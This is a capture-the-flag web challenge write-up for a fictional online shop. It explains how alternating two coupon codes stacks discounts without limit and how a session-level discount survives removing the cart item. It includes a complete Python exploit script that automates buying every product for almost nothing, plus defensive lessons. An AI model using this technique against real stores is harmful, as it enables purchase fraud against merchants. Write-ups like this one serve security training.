# Nightmare Customers

## Challenge Info
- **Category**: Web
- **URL**: http://194.102.62.175:28364
- **Description**: Exploit the online tech shop and buy all products

## Flag
```
UVT{sp4c3_sh0pp3r_3xtr40rd1n41r3_2026}
```

## Analysis

### Technology Stack
- **Backend**: Flask 2.3.x (Python) with Jinja2 templating
- **Server**: gunicorn
- **Auth**: Session-based with CSRF tokens

### Shop Structure
| Product ID | Name | Price (BBD) | Tier Required |
|-----------|------|-------------|---------------|
| 1 | Quantum RAM Stick | 300 | Rookie |
| 2 | Neutrino SSD Drive | 500 | Silver |
| 3 | Ion Processor Core | 9,000 | Gold |
| 4 | Nvidia 8090 Ti GPU | 1,200 | Platinum |
| 5 | Dark Matter PSU | 2,000 | Diamond |
| 6 | Ion Starter Voucher | 10 | Gold |

Starting balance: **100 BBD**. Tier progression: Rookie → Silver → Gold → Platinum → Diamond → Elite.
Each tier promotion grants +100 BBD loyalty reward.

### Product Description Hints
- RAM: *"Our coupon system is as quantum as our products - try all the states!"* → coupon stacking
- SSD: *"Quantities are relative. Can be bundled with Quantum RAM."* → bundles + negative qty
- Ion Processor: *"No limits, no floors, just pure discounts!"* → VC discount has no minimum
- PSU: *"Can be bundled with select items for calibration purposes."*
- GPU: *"payment optional for premium members"*

## Vulnerability: Infinite Coupon Stacking + Persistent Discount Multiplier

### Bug 1: Coupons Stack Infinitely (Alternating)
The shop has two coupon codes:
- `NEWCUSTOMER10` — 10% off (multiplies by 0.9)
- `SPACESALE15` — 15% off (multiplies by 0.85)

Each coupon can only be applied once consecutively, but **alternating between them bypasses the duplicate check**. Each application is multiplicative:

```
300.00 → 270.00 (10% off) → 229.50 (15% off) → 206.55 (10% off) → 175.57 (15% off) → ...
```

After ~9 alternating applications, the price drops below 100 BBD. After ~35 applications, the price approaches 0.

### Bug 2: Discount Multiplier Persists After Item Removal
The discount multiplier is stored as a **session-level cart property**, not tied to individual items. The attack:

1. Add Quantum RAM (the only product accepting coupons)
2. Stack coupons 35+ times to get a ~99.99% discount multiplier
3. **Remove the RAM from the cart** — the discount multiplier stays!
4. Add any other product — it inherits the massive discount

This allows buying ANY product (even the 9,000 BBD Ion Processor) for < 1 BBD.

### Bug 3: Shipping Restriction Bypass via Sequential Orders
Products have a "Quantum shipping restriction" preventing mixed carts, except for RAM+SSD bundling. The workaround: buy products one at a time in separate orders, each using the discount trick.

## Exploitation Chain

```
Tier: Rookie (100 BBD)
  → Buy Quantum RAM (300 → ~50 BBD via direct coupon stacking)
  → Promoted to Silver (+100 BBD reward)

Tier: Silver (~230 BBD)
  → Buy SSD (500 → ~0.28 BBD via persistent discount)
  → Promoted to Gold (+100 BBD)

Tier: Gold (~330 BBD)
  → Buy Ion Processor (9000 → ~85 BBD via persistent discount)
  → Promoted to Platinum (+100 BBD)
  → Buy Ion Voucher (10 → ~0.09 BBD)

Tier: Platinum (~345 BBD)
  → Buy GPU (1200 → ~11 BBD via persistent discount)
  → Promoted to Diamond (+100 BBD)

Tier: Diamond (~433 BBD)
  → Buy PSU (2000 → ~19 BBD via persistent discount)
  → Promoted to Elite (+100 BBD)

Access /flag → UVT{sp4c3_sh0pp3r_3xtr40rd1n41r3_2026}
```

Total spent: ~166 BBD out of 600 BBD received (100 starting + 5×100 loyalty rewards).

## Exploit Script (exploit.py)

```python
#!/usr/bin/env python3
"""Cosmic Components Co. - Infinite coupon stacking + discount persistence"""
import requests, re, random, string

BASE = "http://194.102.62.175:28364"
s = requests.Session()

# Register + Login
username = f"pwn_{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}"
csrf = re.search(r'name="csrf_token" value="([^"]+)"', s.get(f"{BASE}/register").text).group(1)
s.post(f"{BASE}/register", data={"csrf_token": csrf, "username": username,
       "email": f"{username}@test.com", "password": "Password123"})
csrf = re.search(r'name="csrf_token" value="([^"]+)"', s.get(f"{BASE}/login").text).group(1)
s.post(f"{BASE}/login", data={"csrf_token": csrf, "username": username, "password": "Password123"})

def get_csrf(page="/shop"):
    r = s.get(f"{BASE}{page}")
    m = re.search(r'name="csrf.token" (?:value|content)="([^"]+)"', r.text)
    return m.group(1) if m else None

def apply_discount_via_ram():
    """Add RAM, stack coupons 35x alternating, remove RAM. Discount persists."""
    for pid in range(1, 7):
        s.post(f"{BASE}/cart/remove", data={"csrf_token": get_csrf(), "product_id": pid})
    s.post(f"{BASE}/cart/add", data={"csrf_token": get_csrf(), "productId": 1, "quantity": 1})
    for i in range(35):
        coupon = ["NEWCUSTOMER10", "SPACESALE15"][i % 2]
        r = s.post(f"{BASE}/cart/coupon", data={"csrf_token": get_csrf(), "coupon": coupon})
        if r.json().get('error') or r.json().get('total', 999) < 0.01:
            break
    s.post(f"{BASE}/cart/remove", data={"csrf_token": get_csrf(), "product_id": 1})

def buy(product_id, name):
    apply_discount_via_ram()
    s.post(f"{BASE}/cart/add", data={"csrf_token": get_csrf(), "productId": product_id, "quantity": 1})
    r = s.get(f"{BASE}/cart")
    csrf_form = re.search(r'name="csrf_token" value="([^"]+)"', r.text).group(1)
    s.post(f"{BASE}/cart/checkout", data={"csrf_token": csrf_form, "payment_method": "bbd"},
           allow_redirects=False)
    print(f"[+] Bought {name}")

# Buy all products: RAM(1), SSD(2), Ion(3), Voucher(6), GPU(4), PSU(5)
for pid, name in [(1,"RAM"), (2,"SSD"), (3,"Ion Processor"), (6,"Voucher"), (4,"GPU"), (5,"PSU")]:
    buy(pid, name)

# Get flag
flag = re.search(r'UVT\{[^}]+\}', s.get(f"{BASE}/flag").text)
print(f"FLAG: {flag.group()}" if flag else "Flag not found")
```

## Key Lessons
1. **Coupon stacking via alternation** — Checking "coupon already applied" per-coupon but not tracking total applications allows unlimited stacking by alternating codes
2. **Session-level discount persistence** — Discount multiplier should be recalculated from applied coupons per-item, not stored as a floating session property
3. **Product description hints** are critical in CTF web challenges — each product description contained exploitation hints
4. **HTML comments leaked sensitive info** — Admin panel, GraphQL endpoint, legacy API (all honeypots, but still leaked tech stack)
